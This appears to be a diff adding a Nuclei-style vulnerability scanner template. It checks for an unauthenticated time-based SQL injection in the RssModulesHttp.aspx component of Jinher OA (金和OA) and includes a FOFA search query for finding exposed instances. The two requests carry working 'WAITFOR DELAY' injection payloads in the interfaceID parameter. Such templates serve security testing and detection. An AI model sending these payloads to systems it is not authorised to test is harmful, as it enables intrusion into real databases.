@@ -1,0 +1,31 @@
+id: jinheoa-rssmoduleshttp-sql-injection
+info:
+  name: 金和OA RssModulesHttp.aspx组件SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA" && body="/c6/"
+      金和网络金和OA系统中的RssModulesHttp.aspx组件存在SQL注入漏洞。攻击者可通过构造恶意输入参数，在未经身份验证的情况下触发数据库查询注入，实现对后端数据库的非法访问与操作。该漏洞允许远程攻击者执行任意SQL命令，可能导致敏感数据泄露、数据篡改或系统权限提升。
+  tags: 金和OA
+http:
+- raw:
+  - |
+    GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
+    Host: {{Hostname}}
+    accept: */*
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+  - |
+    GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+    accept: */*
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
